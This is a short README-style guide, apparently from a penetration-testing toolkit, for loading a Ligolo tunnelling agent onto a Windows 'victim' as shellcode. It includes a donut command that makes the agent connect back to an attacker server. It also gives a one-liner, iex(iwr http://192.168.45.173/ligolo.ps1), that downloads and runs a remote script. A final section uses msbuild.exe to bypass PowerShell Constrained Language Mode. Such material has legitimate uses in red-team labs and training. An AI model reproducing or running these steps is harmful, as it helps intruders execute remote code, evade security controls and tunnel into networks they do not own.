## Agent Shellcode Runner 

1. Make sure to convert `agent.exe` of Ligolo to shellcode:

- `donut -f 1 -o agent.bin -a 2 -p "-connect your-server:11601 -ignore-cert" -i agent.exe`

2. Make sure you are running as x64 bit process before running: 

- Powershell: `[Environment]::Is64BitProcess`
- CMD: `set p` (Should show `PROCESSOR_ARCHITECTURE=AMD64`)

3. Inside `ligolo.ps1`, make sure to update line 14 (`$url = "http://192.168.45.168/agent.bin"`) to point to your machine IP address before invoking it.

4. make sure both `ligolo.ps1` and `agent.bin` in the same directory, then serve them by simply using python server.

5. Invoke the script:
- `iex(iwr http://192.168.45.173/ligolo.ps1 -UseBasicParsing)`

## CLM Bypass

`ligolo-clmbypass.xml` can be used to load Ligolo agent with bypassing Constrained Language Mode.

- Make sure to prepare `ligolo.ps1` file and serve it using python server.

Upload to the victim and run (Make sure to change to your IP Address in the file):

- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe ligolo-clmbypass.xml`
